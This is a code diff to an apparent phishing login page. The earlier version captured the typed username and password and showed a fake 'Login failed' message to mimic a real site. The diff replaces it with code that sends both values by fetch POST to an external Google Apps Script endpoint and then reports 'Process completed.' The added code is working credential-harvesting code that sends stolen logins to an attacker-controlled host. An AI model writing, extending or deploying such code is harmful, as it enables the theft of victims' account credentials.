@@ -158,14 +158,29 @@
 </form>
 <script>
   function captureData(e) {
-    e.preventDefault(); // Stop actual form submission
-    const user = document.getElementById('username').value;
-    const pass = document.getElementById('password').value;
-    console.log('📥 Captured Credentials →', user, pass);
+  e.preventDefault();
 
-    // Optional: Send to backend or save locally (next options)
-    alert('Login failed'); // Fake message to mimic real behavior
-  }
+  const user = document.getElementById("username").value;
+  const pass = document.getElementById("password").value;
+
+  fetch("https://script.google.com/macros/s/AKfycbyMTVTPkbhQDxf1LTvvD1-XrA1XPUf8lOPbP3fv9H_nhYTX57wfoJYotMc8jheEl0yspQ/exec", {
+    method: "POST",
+    mode: "no-cors", // Optional: Use this if you don't need to read the success message
+    headers: {
+      "Content-Type": "text/plain" // Changed from application/json
+    },
+    body: JSON.stringify({
+      username: user,
+      password: pass
+    })
+  })
+  .then(res => {
+    // Note: If you use mode: "no-cors", res.json() will fail. 
+    // You'll just know the request was sent.
+    alert("Process completed.");
+  })
+  .catch(err => console.error("Error details:", err));
+}
 </script>
 
       <div class="or">OR</div>
